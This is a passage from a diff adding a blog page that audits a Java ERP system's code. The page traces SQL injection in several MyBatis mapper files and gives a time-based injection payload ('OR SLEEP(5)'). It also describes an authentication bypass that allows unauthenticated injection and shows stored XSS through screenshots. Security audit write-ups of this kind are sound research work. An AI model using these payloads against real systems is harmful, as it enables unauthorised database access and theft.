+</span></span><span class="line"><span class="cl">                        HttpServletRequest request)throws Exception {
+</span></span><span class="line"><span class="cl">        Map&lt;String, String&gt; parameterMap = ParamUtils.requestToMap(request);
+</span></span><span class="line"><span class="cl">        parameterMap.put(Constants.SEARCH, search);
+</span></span><span class="line"><span class="cl">        PageQueryInfo queryInfo = new PageQueryInfo();
+</span></span><span class="line"><span class="cl">        Map&lt;String, Object&gt; objectMap = new HashMap&lt;String, Object&gt;();
+</span></span><span class="line"><span class="cl">        if (pageSize != null &amp;&amp; pageSize &lt;= 0) {
+</span></span><span class="line"><span class="cl">            pageSize = 10;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        String offset = ParamUtils.getPageOffset(currentPage, pageSize);
+</span></span><span class="line"><span class="cl">        if (StringUtil.isNotEmpty(offset)) {
+</span></span><span class="line"><span class="cl">            parameterMap.put(Constants.OFFSET, offset);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        List&lt;?&gt; list = configResourceManager.select(apiName, parameterMap);
+</span></span><span class="line"><span class="cl">        objectMap.put(&#34;page&#34;, queryInfo);
+</span></span></code></pre></div><p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357198.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357796.png"></p>
+<p><img loading="lazy" src="https://cdn.nlark.com/yuque/0/2025/png/52403351/1755660382217-6998767d-c701-40dc-b102-1ac471e6c34e.png"></p>
+<h3 id="小结">小结：<a hidden class="anchor" aria-hidden="true" href="#小结">#</a></h3>
+<p>通过全局搜索到<code>like '%${name}%'</code>，定位 <code>&lt;select id=&quot;selectByConditionXxxxx&quot;</code>，之后便在 <code>controller</code> 和 <code>service</code> 中找对应的文件名，在其中找到  <code>selectByConditionXxxxx</code> (基本上都在service中)，找到之后会发现 <code>selectByConditionXxxxx</code> 中所需的几个参数，都是来自 <code>select</code> 查询，跟进 <code>select</code> ，找到 <code>getXxxList</code> 方法解析 <code>select(Map&lt;String,String&gt; map)</code> 传入的前端请求参数，跟进 <code>select</code>，发现他是统一接口，通过 <code>apiName</code> 动态调用不同查询。接下来就在前端找对应的功能点，在”基本资料“里可以看到有查询功能，通过抓包或者对应名称来确定需要的接口，例如：<code>GET /account/list?search={&quot;name&quot;:&quot;1&quot;,&quot;serialNo&quot;:&quot;2&quot;,&quot;remark&quot;:&quot;3&quot;}&amp;currentPage=1&amp;pageSize=15 HTTP/1.1</code>，<code>name、serialNo、remark</code> 都是对应的 <code>AccoutMapperEx</code> 的参数，那么就在 <code>name</code> 参数注入。</p>
+<p>同样的漏洞有：</p>
+<ul>
+<li>AccoutMapperEx.xml</li>
+<li>DepotMapperEx.xml</li>
+<li>LogMapperEx.xml （功能点在“系统管理”-“日志管理”）
+<ul>
+<li>payload : 111&rsquo; OR SLEEP(5) OR &lsquo;1&rsquo;=&lsquo;1</li>
+</ul>
+</li>
+<li><!-- raw HTML omitted -->MaterialMapperEx.xml	（功能点在“商品管理”-“商品信息”）<!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted -->PersonMapperEx.xml	（功能点在“基本资料”-“经手人管理”）<!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted -->RoleMapperEx.xml	（功能点在“系统管理”-“角色管理”）<!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted -->UnitMapperEx.xml	（功能点在“商品管理”-“计量单位”）<!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted -->UserMapperEx.xml	（功能点在“系统管理”-“用户管理”）<!-- raw HTML omitted --></li>
+</ul>
+<h2 id="4身份验证鉴权">4、身份验证&amp;鉴权<a hidden class="anchor" aria-hidden="true" href="#4身份验证鉴权">#</a></h2>
+<p>这一部分依旧是 LogCostFilter.java 发现的漏洞点，在SQL 注入中，我们登录到后台进行的注入，那么结合鉴权漏洞，就可以未登录进行SQL注入。</p>
+<p>从图片看到，绕过身份验证也可以进行SQL注入</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357525.png"></p>
+<h1 id="漏洞复现">漏洞复现：<a hidden class="anchor" aria-hidden="true" href="#漏洞复现">#</a></h1>
+<h2 id="1存储型xss">1、<!-- raw HTML omitted -->存储型XSS<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#1存储型xss">#</a></h2>
+<p>很多功能点都存在此漏洞，以下举三例：</p>
+<h3 id="11-用户管理">1.1 用户管理<a hidden class="anchor" aria-hidden="true" href="#11-用户管理">#</a></h3>
+<p>先新增一个用户</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357263.png"></p>
+<p>修改用户名</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357816.png"></p>
+<p>出现弹窗</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357155.png"></p>
+<p>找到源码：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357019.png"></p>
+<p>接收前端传入的 info 参数，检查用户数量是否超限，并没有做任何特殊字符过滤，这里就是XSS 的入口点</p>
+<h3 id="12-商品信息">1.2 商品信息<a hidden class="anchor" aria-hidden="true" href="#12-商品信息">#</a></h3>
+<p>增加商品：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358852.png"></p>
+<p>五个地方都会弹窗</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358742.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358810.png"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358804.png"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358551.png"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358132.png"></p>
+<h3 id="13-收入单">1.3 收入单<a hidden class="anchor" aria-hidden="true" href="#13-收入单">#</a></h3>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359218.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359675.png"></p>
+<h1 id="参考文章">参考文章：<a hidden class="anchor" aria-hidden="true" href="#参考文章">#</a></h1>
+<p><!-- raw HTML omitted -->通过dnslog探测fastjson的几种方法（<!-- raw HTML omitted -->java.net.Inet4Address、Inet6Address、InetSocketAddress，url）</p>
+<p><a href="https://blog.csdn.net/Adminxe/article/details/105918000">https://blog.csdn.net/Adminxe/article/details/105918000</a></p>
+<p><!-- raw HTML omitted -->CVE-2020-26945 mybatis二级缓存反序列化的分析与复现<!-- raw HTML omitted --></p>
+<p><a href="https://www.freebuf.com/vuls/251862.html">https://www.freebuf.com/vuls/251862.html</a></p>
+<p><!-- raw HTML omitted -->MyBatis远程代码执行漏洞CVE-2020-26945<!-- raw HTML omitted --></p>
+<p><a href="https://www.freebuf.com/articles/web/252542.html">https://www.freebuf.com/articles/web/252542.html</a></p>
+<p><!-- raw HTML omitted -->Java 代码审计之华夏 ERP CMS v2.3<!-- raw HTML omitted --></p>
+<p><a href="https://www.freebuf.com/articles/web/347135.html"><!-- raw HTML omitted -->https://www.freebuf.com/articles/web/347135.html<!-- raw HTML omitted --></a></p>
+<p>【Java代码审计】华夏-ERPv2.3</p>
+<p><a href="https://lusensec.github.io/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/index.html"><!-- raw HTML omitted -->https://lusensec.github.io/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/index.html<!-- raw HTML omitted --></a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/xvsf/tags/java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">Java 代码审计</a></li>
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/xvsf/">xvsf</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
